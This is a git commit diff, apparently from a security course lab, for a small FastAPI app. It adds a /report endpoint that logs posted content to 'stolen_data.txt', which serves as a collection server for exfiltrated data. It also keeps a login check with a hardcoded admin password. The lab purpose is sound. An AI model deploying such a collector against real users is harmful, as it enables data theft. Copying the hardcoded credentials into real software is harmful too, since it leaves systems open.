b951d3d1655d3c3c8a28bca822a53d906a9c7a70
Nur <nur@Nurs-MacBook-Pro.local>
2026-03-04 01:09:03 +0600

    lab12 modified to sync with lab13

--- lab12/main.py
+++ lab12/main.py
@@ -1,25 +1,17 @@
 from typing import Annotated
-
-
 from fastapi import FastAPI, Form
-
 
 app = FastAPI()
 
-
-
-
-ADMIN_USERNAME = "admin"
-ADMIN_PASSWORD = "12345admin"
-
-
-
-
 @app.post("/login")
-def login(
-   username: Annotated[str, Form()],
-   password: Annotated[str, Form()]
-):
-   if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
-       return "secret token"
-   return "Invalid credentials"
+def login(username: Annotated[str, Form()], password: Annotated[str, Form()]):
+    if username == "admin" and password == "12345admin":
+        return "secret token"
+    return "Invalid credentials"
+
+@app.post("/report")
+def receive_logs(content: Annotated[str, Form()]):
+    print(f"Captured Data: {content}")
+    with open("stolen_data.txt", "a") as f:
+        f.write(content + "\n")
+    return {"status": "received"}
